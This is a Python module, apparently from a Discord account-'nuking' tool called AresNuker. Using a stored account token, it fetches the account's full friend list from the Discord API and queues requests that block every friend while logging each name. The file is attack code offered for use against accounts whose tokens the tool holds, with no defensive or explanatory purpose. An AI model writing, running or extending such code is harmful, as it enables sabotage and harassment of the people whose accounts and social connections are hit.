__import__('sys').path.append('../')
import global_vars, requests, json
from AresNuker import Console
from .requests_maker import GetQ

console = Console()
q = GetQ()
headers_account = global_vars.headers_account


def GetFriends():
	r = requests.get('https://discord.com/api/v8/users/@me/relationships', headers = headers_account)
	if r.status_code == 200 or r.status_code == 201:
		friends = json.loads(r.text)
		friend_list = []
		for friend in friends:
			user = friend['user']
			id = user['id']
			username = user['username']
			discriminator = user['discriminator']
			friend_list.append({'id':id, 'username':f'{username}#{discriminator}'})
		return friend_list
	else:
		return None

def BlockFriends() -> None:
	friends = GetFriends()
	if friends == None:
		console.error('Cant get friends list')
		input()
		return
	payload = {
		'type': 2
	}
	for friend in friends:
		q.put((requests.put, f"https://discord.com/api/v8/users/@me/relationships/{friend['id']}", headers_account, payload))
		console.log(f'Blocked → {friend["username"]}')